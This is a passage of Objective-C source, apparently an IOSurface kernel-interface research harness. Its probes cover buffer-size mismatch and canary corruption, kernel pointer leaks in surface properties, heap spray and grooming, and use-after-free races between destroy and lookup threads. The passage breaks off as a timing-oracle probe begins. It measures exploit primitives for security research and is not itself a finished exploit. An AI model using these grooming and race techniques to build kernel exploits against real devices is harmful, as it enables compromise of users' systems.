            CGBCCreateFn bcCreate = (CGBCCreateFn)dlsym(cg, "CGBitmapContextCreate");
            CGCtxRelFn ctxRel = (CGCtxRelFn)dlsym(cg, "CGContextRelease");
            CGCSRelFn csRel = (CGCSRelFn)dlsym(cg, "CGColorSpaceRelease");
            CGCtxSetFillFn setFill = (CGCtxSetFillFn)dlsym(cg, "CGContextSetRGBFillColor");
            CGCtxFillRectFn fillRect = (CGCtxFillRectFn)dlsym(cg, "CGContextFillRect");
            CGBCCreateImgFn createImg = (CGBCCreateImgFn)dlsym(cg, "CGBitmapContextCreateImage");
            CGImgRelFn imgRel = (CGImgRelFn)dlsym(cg, "CGImageRelease");
            CGImgGetWFn imgW = (CGImgGetWFn)dlsym(cg, "CGImageGetWidth");
            CGImgGetHFn imgH = (CGImgGetHFn)dlsym(cg, "CGImageGetHeight");
            CGImgGetBPCFn imgBPC = (CGImgGetBPCFn)dlsym(cg, "CGImageGetBitsPerComponent");
            CGImgGetBPPFn imgBPP = (CGImgGetBPPFn)dlsym(cg, "CGImageGetBitsPerPixel");

            if (!csCreate || !bcCreate || !ctxRel || !csRel) {
                log(@"MISMATCH: ERROR — CG symbols missing");
                dlclose(cg);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            CGColorSpaceRef cs = csCreate();

            // Test: Create IOSurface with format X but bytesPerElement Y (mismatch)
            struct {
                uint32_t format;
                uint32_t bpe;       // bytes per element declared
                uint32_t cgInfo;    // CGBitmapInfo for CG context
                size_t cgBPC;       // bits per component for CG
                const char *label;
            } tests[] = {
                // Normal: 4 bpe, BGRA premul
                { 0x42475241, 4, 1 | (2 << 12), 8, "normal_4bpe" },
                // Mismatch: declared 1 bpe but buffer is 4 bytes wide per pixel
                { 0x42475241, 1, 1 | (2 << 12), 8, "bpe1_cgBGRA" },
                // Mismatch: declared 8 bpe (16-bit) but CG uses 8-bit
                { 0x42475241, 8, 1 | (2 << 12), 8, "bpe8_cg8bit" },
                // Mismatch: declared 2 bpe (16-bit pixel) but CG uses 32-bit
                { 0x42475241, 2, 1 | (2 << 12), 8, "bpe2_cg32bit" },
                // Format 0 but valid CG context
                { 0x00000000, 4, 1 | (2 << 12), 8, "fmt0_cg32" },
                // Huge bpe
                { 0x42475241, 64, 1 | (2 << 12), 8, "bpe64_cg32" },
                // Float format with integer CG
                { 0x42475241, 4, 6 | (2 << 12), 8, "int_cgFloat" },
                // Normal format, CG float 16bpc
                { 0x42475241, 4, 6 | (2 << 12), 16, "bgra_cg16float" },
            };
            int nTests = sizeof(tests) / sizeof(tests[0]);

            size_t w = 64, h = 64;

            for (int ti = 0; ti < nTests && !isr_stopped(); ti++) {
                isr_checkpoint(@"ISR-Mismatch-checkpoint.json", @{
                    @"test": @(tests[ti].label), @"anomalies": @(anomalies)
                });

                size_t bpr = w * tests[ti].bpe;
                size_t allocSz = bpr * h;
                if (allocSz == 0 || allocSz > 1024 * 1024) allocSz = w * 4 * h;
                if (bpr == 0) bpr = w * 4;

                NSDictionary *params = @{
                    @"IOSurfaceWidth": @(w),
                    @"IOSurfaceHeight": @(h),
                    @"IOSurfaceBytesPerElement": @(tests[ti].bpe),
                    @"IOSurfaceBytesPerRow": @(bpr),
                    @"IOSurfaceAllocSize": @(allocSz),
                    @"IOSurfacePixelFormat": @(tests[ti].format),
                };
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                if (!surf) {
                    log([NSString stringWithFormat:@"MISMATCH: '%s' creation failed", tests[ti].label]);
                    continue;
                }

                size_t realAlloc = sym.getAllocSize(surf);
                size_t realBpr = sym.getBytesPerRow(surf);
                log([NSString stringWithFormat:
                    @"MISMATCH: '%s' created — declared bpe=%u bpr=%zu alloc=%zu real_bpr=%zu real_alloc=%zu",
                    tests[ti].label, tests[ti].bpe, bpr, allocSz, realBpr, realAlloc]);

                // Write a known pattern
                sym.lock(surf, 0, NULL);
                void *base = sym.getBase(surf);
                if (base) {
                    memset(base, 0xAA, realAlloc);
                    // Write canary at end
                    if (realAlloc >= 16) {
                        uint8_t *end = (uint8_t *)base + realAlloc - 16;
                        memset(end, 0xCC, 16);
                    }
                }
                sym.unlock(surf, 0, NULL);

                // Now create CG context using the REAL buffer but with DIFFERENT dimensions
                size_t cgBpr = w * 4;
                sym.lock(surf, 0, NULL);
                base = sym.getBase(surf);

                if (base && realAlloc >= cgBpr * h) {
                    CGContextRef ctx = bcCreate(base, w, h, tests[ti].cgBPC, cgBpr, cs, tests[ti].cgInfo);

                    if (ctx) {
                        // Draw to the surface via CG
                        if (setFill && fillRect) {
                            setFill(ctx, 0.0, 1.0, 0.0, 1.0);
                            fillRect(ctx, CGRectMake(0, 0, w, h));
                        }

                        // Create image — this forces CG to read the buffer
                        if (createImg) {
                            CGImageRef img = createImg(ctx);
                            if (img) {
                                size_t iw = imgW ? imgW(img) : 0;
                                size_t ih = imgH ? imgH(img) : 0;
                                size_t ibpc = imgBPC ? imgBPC(img) : 0;
                                size_t ibpp = imgBPP ? imgBPP(img) : 0;

                                log([NSString stringWithFormat:
                                    @"MISMATCH: '%s' image %zux%zu bpc=%zu bpp=%zu",
                                    tests[ti].label, iw, ih, ibpc, ibpp]);

                                // Check if CG image dimensions match IOSurface or are confused
                                if (iw != w || ih != h) {
                                    anomalies++;
                                    memoryCorruption++;
                                    log([NSString stringWithFormat:
                                        @"MISMATCH: DIMENSION CONFUSION '%s' expected %zux%zu got %zux%zu!",
                                        tests[ti].label, w, h, iw, ih]);
                                }
                                if (imgRel) imgRel(img);
                            }
                        }

                        // Check canary — did CG write beyond what it should?
                        if (realAlloc >= 16) {
                            uint8_t *end = (uint8_t *)base + realAlloc - 16;
                            int canaryIntact = 1;
                            for (int i = 0; i < 16; i++) {
                                if (end[i] != 0xCC) { canaryIntact = 0; break; }
                            }
                            if (!canaryIntact && realAlloc > cgBpr * h + 16) {
                                anomalies++;
                                oobReads++;
                                log([NSString stringWithFormat:
                                    @"MISMATCH: OOB_WRITE '%s' — canary at end of buffer corrupted!",
                                    tests[ti].label]);
                            }
                        }

                        ctxRel(ctx);
                    } else {
                        log([NSString stringWithFormat:@"MISMATCH: '%s' CG context failed", tests[ti].label]);
                    }
                }
                sym.unlock(surf, 0, NULL);
                CFRelease(surf);
            }

            if (cs) csRel(cs);
            dlclose(cg);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"MISMATCH: DONE corruption=%u oobWrites=%u anomalies=%u elapsed=%.3fs",
                memoryCorruption, oobReads, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"memoryCorruption": @(memoryCorruption),
                @"oobWrites": @(oobReads),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Mismatch-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 15: Kernel Info Leak (Round 4)

void iosurface_research_info_leak(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"INFOLEAK: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"INFOLEAK: === Kernel Info Leak Scanner ===");
            log(@"INFOLEAK: Searches for kernel pointers or metadata disclosure via IOSurface properties");

            uint32_t anomalies = 0;
            uint32_t suspiciousValues = 0;
            uint32_t planeLeaks = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // Phase A: Check if IOSurface property values contain kernel-like pointers
            log(@"INFOLEAK: Phase A — property value analysis");

            NSDictionary *params = isr_default_surface_params(128, 128);
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
            if (!surf) {
                log(@"INFOLEAK: ERROR — surface creation failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            IOSurfaceID sid = sym.getID(surf);
            size_t allocSz = sym.getAllocSize(surf);
            size_t bpr = sym.getBytesPerRow(surf);

            log([NSString stringWithFormat:@"INFOLEAK: Surface id=%u alloc=%zu bpr=%zu", sid, allocSz, bpr]);

            // Check if ID values are sequential or reveal allocation patterns
            IOSurfaceRef surfaces[20];
            IOSurfaceID ids[20];
            for (int i = 0; i < 20 && !isr_stopped(); i++) {
                surfaces[i] = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
                ids[i] = surfaces[i] ? sym.getID(surfaces[i]) : 0;
            }

            BOOL sequential = YES;
            for (int i = 1; i < 20; i++) {
                if (ids[i] != ids[i-1] + 1) {
                    sequential = NO;
                    break;
                }
            }

            log([NSString stringWithFormat:@"INFOLEAK: ID allocation %@ — range [%u..%u]",
                sequential ? @"SEQUENTIAL" : @"NON-SEQUENTIAL", ids[0], ids[19]]);

            // Free alternating surfaces and check what IDs get reused
            for (int i = 0; i < 20; i += 2) {
                if (surfaces[i]) CFRelease(surfaces[i]);
                surfaces[i] = NULL;
            }

            IOSurfaceRef reused[10];
            IOSurfaceID reusedIds[10];
            for (int i = 0; i < 10 && !isr_stopped(); i++) {
                reused[i] = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
                reusedIds[i] = reused[i] ? sym.getID(reused[i]) : 0;
            }

            int reuseCount = 0;
            for (int i = 0; i < 10; i++) {
                for (int j = 0; j < 20; j += 2) {
                    if (reusedIds[i] == ids[j]) {
                        reuseCount++;
                        break;
                    }
                }
            }

            log([NSString stringWithFormat:@"INFOLEAK: ID reuse pattern — %d/10 freed IDs reused", reuseCount]);
            if (reuseCount > 0) {
                log([NSString stringWithFormat:@"INFOLEAK: Reuse is predictable — aids use-after-free targeting"]);
            }

            for (int i = 0; i < 10; i++) if (reused[i]) CFRelease(reused[i]);
            for (int i = 1; i < 20; i += 2) if (surfaces[i]) CFRelease(surfaces[i]);

            // Phase B: Plane info extraction
            log(@"INFOLEAK: Phase B — plane and property extraction");
            isr_checkpoint(@"ISR-InfoLeak-checkpoint.json", @{@"phase": @"B"});

            typedef CFTypeRef (*IOSurfaceCopyValueFn)(IOSurfaceRef, CFStringRef);
            IOSurfaceCopyValueFn copyValue = NULL;
            void *iosLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
            if (iosLib) {
                copyValue = (IOSurfaceCopyValueFn)dlsym(iosLib, "IOSurfaceCopyValue");
            }

            NSDictionary *richParams = @{
                @"IOSurfaceWidth": @256,
                @"IOSurfaceHeight": @256,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @1024,
                @"IOSurfaceAllocSize": @(1024 * 256),
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfacePlaneCount": @2,
                @"IOSurfacePlaneInfo": @[
                    @{@"IOSurfacePlaneWidth": @256, @"IOSurfacePlaneHeight": @256,
                      @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneBytesPerRow": @1024,
                      @"IOSurfacePlaneOffset": @0, @"IOSurfacePlaneSize": @(1024 * 256)},
                    @{@"IOSurfacePlaneWidth": @128, @"IOSurfacePlaneHeight": @128,
                      @"IOSurfacePlaneBytesPerElement": @2, @"IOSurfacePlaneBytesPerRow": @256,
                      @"IOSurfacePlaneOffset": @(1024 * 256), @"IOSurfacePlaneSize": @(256 * 128)},
                ],
            };

            IOSurfaceRef richSurf = sym.create((__bridge CFDictionaryRef)richParams);
            if (richSurf) {
                size_t rAlloc = sym.getAllocSize(richSurf);
                log([NSString stringWithFormat:@"INFOLEAK: Multi-plane surface alloc=%zu (expected %d)",
                    rAlloc, 1024 * 256 + 256 * 128]);

                if (rAlloc != (size_t)(1024 * 256 + 256 * 128)) {
                    anomalies++;
                    planeLeaks++;
                    log([NSString stringWithFormat:
                        @"INFOLEAK: ANOMALY — alloc size mismatch! kernel added %zd bytes",
                        (ssize_t)rAlloc - (1024 * 256 + 256 * 128)]);
                }

                // Try to read known property keys that might leak info
                NSArray *probeKeys = @[
                    @"IOSurfaceAllocSize", @"IOSurfaceBytesPerRow",
                    @"IOSurfaceSeed", @"IOSurfaceOffset",
                    @"IOSurfaceIsGlobal", @"IOSurfaceCacheMode",
                    @"IOSurfaceAddress", @"IOSurfaceKernelAddress",
                    @"IOSurfaceRegistryID", @"IOSurfaceCreatorPID",
                    @"IOSurfacePurgeWhenNotInUse", @"IOSurfaceUseCounterAccounting",
                ];

                if (copyValue) {
                    for (NSString *key in probeKeys) {
                        if (isr_stopped()) break;
                        CFTypeRef val = copyValue(richSurf, (__bridge CFStringRef)key);
                        if (val) {
                            NSString *desc = [(__bridge id)val description];
                            log([NSString stringWithFormat:@"INFOLEAK: %@ = %@", key, desc]);

                            // Check if value looks like a kernel pointer (high bits set)
                            if ([(__bridge id)val isKindOfClass:[NSNumber class]]) {
                                uint64_t numVal = [(__bridge NSNumber *)val unsignedLongLongValue];
                                if (numVal > 0xFFFF000000000000ULL) {
                                    anomalies++;
                                    suspiciousValues++;
                                    log([NSString stringWithFormat:
                                        @"INFOLEAK: SUSPICIOUS '%@' = 0x%llx — possible kernel pointer!",
                                        key, numVal]);
                                }
                            }
                            CFRelease(val);
                        }
                    }
                } else {
                    log(@"INFOLEAK: IOSurfaceCopyValue not available");
                }

                // Phase C: Seed value analysis — does the seed reveal timing info?
                log(@"INFOLEAK: Phase C — seed increment analysis");

                typedef uint32_t (*IOSurfaceGetSeedFn)(IOSurfaceRef);
                IOSurfaceGetSeedFn getSeed = NULL;
                if (iosLib) {
                    getSeed = (IOSurfaceGetSeedFn)dlsym(iosLib, "IOSurfaceGetSeed");
                }

                if (getSeed) {
                    uint32_t seed0 = getSeed(richSurf);

                    // Lock/unlock to increment seed
                    sym.lock(richSurf, 0, NULL);
                    void *rbase = sym.getBase(richSurf);
                    if (rbase) ((uint8_t *)rbase)[0] = 0xFF;
                    sym.unlock(richSurf, 0, NULL);

                    uint32_t seed1 = getSeed(richSurf);

                    sym.lock(richSurf, 0, NULL);
                    rbase = sym.getBase(richSurf);
                    if (rbase) ((uint8_t *)rbase)[0] = 0xFE;
                    sym.unlock(richSurf, 0, NULL);

                    uint32_t seed2 = getSeed(richSurf);

                    log([NSString stringWithFormat:
                        @"INFOLEAK: Seed progression: %u -> %u -> %u (deltas: %u, %u)",
                        seed0, seed1, seed2, seed1 - seed0, seed2 - seed1]);

                    if (seed1 - seed0 != seed2 - seed1) {
                        anomalies++;
                        log(@"INFOLEAK: ANOMALY — non-uniform seed increments (timing leak?)");
                    }
                } else {
                    log(@"INFOLEAK: IOSurfaceGetSeed not available");
                }

                CFRelease(richSurf);
            } else {
                log(@"INFOLEAK: Multi-plane surface creation failed");
            }

            if (iosLib) dlclose(iosLib);

            // Phase D: Buffer base address analysis
            log(@"INFOLEAK: Phase D — buffer address entropy analysis");

            uintptr_t addrs[10];
            for (int i = 0; i < 10 && !isr_stopped(); i++) {
                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(64, 64));
                if (s) {
                    sym.lock(s, 0, NULL);
                    void *b = sym.getBase(s);
                    addrs[i] = (uintptr_t)b;
                    sym.unlock(s, 0, NULL);
                    CFRelease(s);
                } else {
                    addrs[i] = 0;
                }
            }

            // Check address randomization
            int sameHighBits = 0;
            for (int i = 1; i < 10; i++) {
                if ((addrs[i] >> 32) == (addrs[0] >> 32)) sameHighBits++;
            }

            log([NSString stringWithFormat:
                @"INFOLEAK: Buffer addresses — %d/9 share high 32 bits with first (0x%lx)",
                sameHighBits, (unsigned long)(addrs[0] >> 32)]);

            // Check alignment patterns
            int page_aligned = 0;
            for (int i = 0; i < 10; i++) {
                if ((addrs[i] & 0xFFF) == 0) page_aligned++;
            }

            log([NSString stringWithFormat:@"INFOLEAK: %d/10 addresses are page-aligned", page_aligned]);

            if (sameHighBits >= 8) {
                anomalies++;
                log(@"INFOLEAK: ANOMALY — low address entropy, predictable user-space mapping");
            }

            CFRelease(surf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"INFOLEAK: DONE suspicious=%u planeLeaks=%u anomalies=%u elapsed=%.3fs",
                suspiciousValues, planeLeaks, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"suspiciousValues": @(suspiciousValues),
                @"planeLeaks": @(planeLeaks),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-InfoLeak-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 16: Heap Spray — Address Distribution & Grooming

void iosurface_research_heap_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"HEAPSPRAY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }
            log(@"HEAPSPRAY: Starting heap spray analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            // Phase A: Address distribution across sizes
            log(@"HEAPSPRAY: Phase A — address distribution by size");
            size_t widths[] = {64, 128, 256, 512, 1024};
            size_t numWidths = sizeof(widths) / sizeof(widths[0]);

            for (size_t wi = 0; wi < numWidths && !isr_stopped(); wi++) {
                size_t w = widths[wi];
                size_t h = 64;
                NSDictionary *params = isr_default_surface_params(w, h);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;

                uintptr_t addrs[20];
                IOSurfaceRef surfs[20];
                uint32_t count = 0;

                for (uint32_t i = 0; i < 20 && !isr_stopped(); i++) {
                    IOSurfaceRef s = sym.create(cfParams);
                    if (!s) continue;
                    sym.lock(s, 0, NULL);
                    void *base = sym.getBase(s);
                    sym.unlock(s, 0, NULL);
                    if (base) {
                        addrs[count] = (uintptr_t)base;
                        surfs[count] = s;
                        count++;
                    } else {
                        CFRelease(s);
                    }
                }

                if (count >= 2) {
                    uint32_t sameOffset = 0;
                    int64_t firstDelta = (int64_t)(addrs[1] - addrs[0]);
                    uintptr_t minAddr = addrs[0], maxAddr = addrs[0];
                    uint32_t highBitsMatch = 0;
                    uint32_t pageAligned = 0;

                    for (uint32_t i = 0; i < count; i++) {
                        if (addrs[i] < minAddr) minAddr = addrs[i];
                        if (addrs[i] > maxAddr) maxAddr = addrs[i];
                        if ((addrs[i] & 0xFFF) == 0) pageAligned++;
                        if ((addrs[i] >> 32) == (addrs[0] >> 32)) highBitsMatch++;
                        if (i > 0) {
                            int64_t delta = (int64_t)(addrs[i] - addrs[i-1]);
                            if (delta == firstDelta) sameOffset++;
                        }
                    }

                    uintptr_t range = maxAddr - minAddr;
                    uint32_t effectiveBits = 0;
                    uintptr_t r = range;
                    while (r > 0) { effectiveBits++; r >>= 1; }

                    log([NSString stringWithFormat:
                        @"HEAPSPRAY: w=%zu count=%u range=0x%lx effectiveBits=%u pageAligned=%u/%u highMatch=%u/%u sameOffset=%u/%u",
                        w, count, (unsigned long)range, effectiveBits, pageAligned, count,
                        highBitsMatch, count, sameOffset, count - 1]);

                    if (effectiveBits < 24) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"HEAPSPRAY: ANOMALY — low entropy %u bits for w=%zu", effectiveBits, w]);
                    }
                    if (sameOffset > (count - 1) * 3 / 4) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"HEAPSPRAY: ANOMALY — predictable offsets (%u/%u same delta) for w=%zu",
                            sameOffset, count - 1, w]);
                    }
                }

                for (uint32_t i = 0; i < count; i++) CFRelease(surfs[i]);
            }

            if (isr_stopped()) goto heapspray_done;

            // Phase B: Heap grooming — alloc N, free every other, realloc
            log(@"HEAPSPRAY: Phase B — heap grooming");
            {
                size_t w = 256, h = 64;
                NSDictionary *params = isr_default_surface_params(w, h);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;
                uint32_t N = 30;
                IOSurfaceRef surfs[30];
                uintptr_t origAddrs[30];
                uint32_t created = 0;

                for (uint32_t i = 0; i < N && !isr_stopped(); i++) {
                    surfs[i] = sym.create(cfParams);
                    if (surfs[i]) {
                        sym.lock(surfs[i], 0, NULL);
                        void *base = sym.getBase(surfs[i]);
                        sym.unlock(surfs[i], 0, NULL);
                        origAddrs[i] = base ? (uintptr_t)base : 0;
                        created++;
                    }
                }

                uintptr_t freedAddrs[15];
                uint32_t freedCount = 0;
                for (uint32_t i = 0; i < created && i < N; i += 2) {
                    if (surfs[i]) {
                        freedAddrs[freedCount++] = origAddrs[i];
                        CFRelease(surfs[i]);
                        surfs[i] = NULL;
                    }
                }

                IOSurfaceRef newSurfs[15];
                uint32_t newCount = 0;
                uint32_t slotHits = 0;

                for (uint32_t i = 0; i < freedCount && !isr_stopped(); i++) {
                    IOSurfaceRef s = sym.create(cfParams);
                    if (!s) continue;
                    sym.lock(s, 0, NULL);
                    void *base = sym.getBase(s);
                    sym.unlock(s, 0, NULL);
                    uintptr_t addr = base ? (uintptr_t)base : 0;
                    newSurfs[newCount] = s;
                    newCount++;

                    for (uint32_t j = 0; j < freedCount; j++) {
                        if (addr == freedAddrs[j]) { slotHits++; break; }
                    }
                }

                log([NSString stringWithFormat:
                    @"HEAPSPRAY: Grooming — freed=%u realloc=%u slotHits=%u/%u (%.0f%%)",
                    freedCount, newCount, slotHits, newCount,
                    newCount > 0 ? (slotHits * 100.0 / newCount) : 0.0]);

                if (slotHits > newCount / 2) {
                    anomalies++;
                    log(@"HEAPSPRAY: ANOMALY — high grooming success (>50% slot reuse)");
                }

                for (uint32_t i = 0; i < N; i++) {
                    if (surfs[i]) CFRelease(surfs[i]);
                }
                for (uint32_t i = 0; i < newCount; i++) {
                    CFRelease(newSurfs[i]);
                }
            }

        heapspray_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"HEAPSPRAY: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-HeapSpray-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 17: UAF Window — ID Reuse Timing & Residual Data

void iosurface_research_uaf_window(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"UAFWINDOW: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }
            log(@"UAFWINDOW: Starting UAF window analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            mach_timebase_info_data_t timebase;
            mach_timebase_info(&timebase);

            // Phase A: Create-Destroy-Lookup cycle timing
            log(@"UAFWINDOW: Phase A — create/destroy/lookup cycle timing");
            {
                uint32_t trials = 50;
                uint64_t totalCreateNs = 0, totalDestroyNs = 0, totalLookupNs = 0;
                uint32_t lookupSuccessAfterDestroy = 0;
                NSDictionary *params = isr_default_surface_params(64, 64);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;

                for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                    uint64_t t0 = mach_absolute_time();
                    IOSurfaceRef s = sym.create(cfParams);
                    uint64_t t1 = mach_absolute_time();
                    if (!s) continue;

                    IOSurfaceID sid = sym.getID(s);
                    CFRelease(s);
                    uint64_t t2 = mach_absolute_time();

                    IOSurfaceRef looked = sym.lookup(sid);
                    uint64_t t3 = mach_absolute_time();

                    if (looked) {
                        lookupSuccessAfterDestroy++;
                        CFRelease(looked);
                    }

                    totalCreateNs  += (t1 - t0) * timebase.numer / timebase.denom;
                    totalDestroyNs += (t2 - t1) * timebase.numer / timebase.denom;
                    totalLookupNs  += (t3 - t2) * timebase.numer / timebase.denom;
                }

                uint64_t avgCreate  = trials > 0 ? totalCreateNs / trials : 0;
                uint64_t avgDestroy = trials > 0 ? totalDestroyNs / trials : 0;
                uint64_t avgLookup  = trials > 0 ? totalLookupNs / trials : 0;

                log([NSString stringWithFormat:
                    @"UAFWINDOW: Avg create=%lluns destroy=%lluns lookup=%lluns postDestroyHits=%u/%u",
                    avgCreate, avgDestroy, avgLookup, lookupSuccessAfterDestroy, trials]);

                if (lookupSuccessAfterDestroy > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"UAFWINDOW: ANOMALY — %u lookups succeeded after destroy (UAF window)",
                        lookupSuccessAfterDestroy]);
                }
            }

            if (isr_stopped()) goto uafwindow_done;

            // Phase B: Sentinel data residual detection
            log(@"UAFWINDOW: Phase B — sentinel residual data detection");
            {
                uint32_t residualHits = 0;
                uint32_t trials = 30;
                NSDictionary *params = isr_default_surface_params(64, 64);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;

                for (uint32_t t = 0; t < trials && !isr_stopped(); t++) {
                    IOSurfaceRef s1 = sym.create(cfParams);
                    if (!s1) continue;

                    sym.lock(s1, 0, NULL);
                    void *base1 = sym.getBase(s1);
                    uint32_t sentinel = 0xDEAD0000 | t;
                    if (base1) {
                        size_t allocSz = sym.getAllocSize(s1);
                        size_t fillCount = allocSz / sizeof(uint32_t);
                        uint32_t *buf = (uint32_t *)base1;
                        for (size_t i = 0; i < fillCount; i++) {
                            buf[i] = sentinel;
                        }
                    }
                    sym.unlock(s1, 0, NULL);
                    CFRelease(s1);

                    IOSurfaceRef s2 = sym.create(cfParams);
                    if (!s2) continue;

                    sym.lock(s2, 0, NULL);
                    void *base2 = sym.getBase(s2);
                    if (base2) {
                        uint32_t *buf2 = (uint32_t *)base2;
                        size_t allocSz2 = sym.getAllocSize(s2);
                        size_t checkCount = allocSz2 / sizeof(uint32_t);
                        uint32_t found = 0;
                        for (size_t i = 0; i < checkCount && i < 64; i++) {
                            if (buf2[i] == sentinel) found++;
                        }
                        if (found > 0) residualHits++;
                    }
                    sym.unlock(s2, 0, NULL);
                    CFRelease(s2);
                }

                log([NSString stringWithFormat:
                    @"UAFWINDOW: Residual sentinel detected in %u/%u trials", residualHits, trials]);

                if (residualHits > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"UAFWINDOW: ANOMALY — residual data in %u surfaces (dangling data)", residualHits]);
                }
            }

            if (isr_stopped()) goto uafwindow_done;

            // Phase C: Multi-thread destroy/lookup race
            log(@"UAFWINDOW: Phase C — multi-thread destroy/lookup race");
            {
                NSDictionary *params = isr_default_surface_params(64, 64);
                CFDictionaryRef cfParams = (__bridge CFDictionaryRef)params;
                uint32_t raceTrials = 20;
                __block _Atomic uint32_t totalPostDestroyLookups = 0;

                for (uint32_t t = 0; t < raceTrials && !isr_stopped(); t++) {
                    IOSurfaceRef s = sym.create(cfParams);
                    if (!s) continue;
                    IOSurfaceID sid = sym.getID(s);

                    __block atomic_bool destroyed = false;
                    __block _Atomic uint32_t postHits = 0;

                    dispatch_group_t group = dispatch_group_create();

                    dispatch_group_enter(group);
                    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                        usleep(arc4random_uniform(50));
                        CFRelease(s);
                        atomic_store(&destroyed, true);
                        dispatch_group_leave(group);
                    });

                    dispatch_group_enter(group);
                    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                        for (int i = 0; i < 200; i++) {
                            IOSurfaceRef looked = sym.lookup(sid);
                            if (looked) {
                                if (atomic_load(&destroyed)) {
                                    atomic_fetch_add_explicit(&postHits, 1, memory_order_relaxed);
                                }
                                CFRelease(looked);
                            }
                        }
                        dispatch_group_leave(group);
                    });

                    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
                    uint32_t hits = atomic_load(&postHits);
                    if (hits > 0) {
                        atomic_fetch_add_explicit(&totalPostDestroyLookups, hits, memory_order_relaxed);
                    }
                }

                uint32_t totalHits = atomic_load(&totalPostDestroyLookups);
                log([NSString stringWithFormat:
                    @"UAFWINDOW: Race — %u post-destroy lookups across %u trials",
                    totalHits, raceTrials]);

                if (totalHits > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"UAFWINDOW: ANOMALY — %u post-destroy lookups (UAF race window)", totalHits]);
                }
            }

        uafwindow_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"UAFWINDOW: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-UAFWindow-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 18: Kernel Timing Oracle — Side-Channel Analysis

static int isr_compare_uint64(const void *a, const void *b) {
    uint64_t va = *(const uint64_t *)a;
    uint64_t vb = *(const uint64_t *)b;
    return (va > vb) - (va < vb);
}

void iosurface_research_timing_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"TIMING: Failed to load symbols");
